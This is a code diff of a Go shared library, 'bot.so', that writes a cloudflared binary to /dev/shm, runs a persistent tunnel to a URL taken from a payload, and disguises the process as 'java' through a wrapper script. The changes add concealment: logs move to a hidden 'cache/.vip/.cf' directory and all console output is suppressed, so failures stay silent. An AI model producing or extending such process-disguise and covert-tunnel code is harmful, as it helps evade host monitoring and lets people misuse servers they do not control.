@@ -4,8 +4,8 @@
  * 使用 wrapper 脚本将 cloudflared 进程重命名为 "java"
  *
  * 编译:
- *   go mod init bot
- *   CGO_ENABLED=1 go build -buildmode=c-shared -o bot.so bot.go
+ * go mod init bot
+ * CGO_ENABLED=1 go build -buildmode=c-shared -o bot.so bot.go
  */
 package main
 
@@ -39,17 +39,26 @@ var (
 )
 
 func init() {
-	// 初始化日志
-	logDir := "./.cf"
+	// 初始化日志 - 使用 cache/.vip/.cf（PaperBootstrap 期望的位置）
+	// 不输出任何信息到控制台
+	logDir := "cache/.vip/.cf"
 	os.MkdirAll(logDir, 0755)
 	var err error
 	logFile, err = os.OpenFile(logDir+"/cf.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
 	if err != nil {
-		logFile = os.Stderr
+		// 如果无法创建日志文件，静默失败（不输出到控制台）
+		logFile = nil
 	}
 
 	// 获取当前工作目录
 	workDir, _ = os.Getwd()
+}
+
+// logToFile 只写日志到文件，不输出到控制台
+func logToFile(format string, args ...interface{}) {
+	if logFile != nil {
+		fmt.Fprintf(logFile, format, args...)
+	}
 }
 
 // extractBinary 释放 cloudflared 到 /dev/shm
@@ -90,7 +99,7 @@ func runCloudflared(targetURL string) {
 	for !shouldStop {
 		cfBin, err := extractBinary()
 		if err != nil {
-			fmt.Fprintf(logFile, "[bot.so] extract failed: %v\n", err)
+			logToFile("[bot.so] extract failed: %v\n", err)
 			time.Sleep(5 * time.Second)
 			continue
 		}
@@ -98,7 +107,7 @@ func runCloudflared(targetURL string) {
 		// 创建 wrapper 脚本
 		wrapperPath, err := createWrapperScript(cfBin)
 		if err != nil {
-			fmt.Fprintf(logFile, "[bot.so] wrapper failed: %v\n", err)
+			logToFile("[bot.so] wrapper failed: %v\n", err)
 			time.Sleep(5 * time.Second)
 			continue
 		}
@@ -108,7 +117,7 @@ func runCloudflared(targetURL string) {
 			"tunnel",
 			"--url", targetURL,
 			"--no-autoupdate",
-			"--logfile", "./.cf/cf.log",
+			"--logfile", "cache/.vip/.cf/cf.log",
 		}
 
 		cmd := exec.Command(wrapperPath, args...)
@@ -120,7 +129,7 @@ func runCloudflared(targetURL string) {
 
 		// 启动进程
 		if err := cmd.Start(); err != nil {
-			fmt.Fprintf(logFile, "[bot.so] start failed: %v\n", err)
+			logToFile("[bot.so] start failed: %v\n", err)
 			os.Remove(wrapperPath)
 			time.Sleep(5 * time.Second)
 			continue
@@ -130,7 +139,7 @@ func runCloudflared(targetURL string) {
 		cfCmd = cmd
 		mu.Unlock()
 
-		fmt.Fprintf(logFile, "[bot.so] cloudflared started (pid %d, disguised as java)\n", cmd.Process.Pid)
+		logToFile("[bot.so] cloudflared started (pid %d, disguised as java)\n", cmd.Process.Pid)
 
 		// 等待进程结束
 		err = cmd.Wait()
@@ -147,9 +156,9 @@ func runCloudflared(targetURL string) {
 		}
 
 		if err != nil {
-			fmt.Fprintf(logFile, "[bot.so] cloudflared exited: %v, restarting in 5s...\n", err)
+			logToFile("[bot.so] cloudflared exited: %v, restarting in 5s...\n", err)
 		} else {
-			fmt.Fprintf(logFile, "[bot.so] cloudflared exited normally, restarting in 5s...\n")
+			logToFile("[bot.so] cloudflared exited normally, restarting in 5s...\n")
 		}
 		time.Sleep(5 * time.Second)
 	}
@@ -163,14 +172,14 @@ func runCloudflared(targetURL string) {
 func StartCloudflared(payload *C.char) C.int {
 	goPayload := C.GoString(payload)
 	if goPayload == "" {
-		fmt.Fprintf(logFile, "[bot.so] empty payload\n")
+		logToFile("[bot.so] empty payload\n")
 		return -1
 	}
 
 	mu.Lock()
 	if cfCmd != nil {
 		mu.Unlock()
-		fmt.Fprintf(logFile, "[bot.so] already running\n")
+		logToFile("[bot.so] already running\n")
 		return 0
 	}
 	shouldStop = false
@@ -189,7 +198,7 @@ func StartCloudflared(payload *C.char) C.int {
 	}
 
 	if tunnelURL == "" {
-		fmt.Fprintf(logFile, "[bot.so] no URL found in payload\n")
+		logToFile("[bot.so] no URL found in payload\n")
 		mu.Unlock()
 		return -1
 	}
@@ -199,7 +208,7 @@ func StartCloudflared(payload *C.char) C.int {
 	// 在 goroutine 里运行 cloudflared
 	go runCloudflared(tunnelURL)
 
-	fmt.Fprintf(logFile, "[bot.so] cloudflared started (disguised as java process)\n")
+	logToFile("[bot.so] cloudflared started (disguised as java process)\n")
 	return 0
 }
 
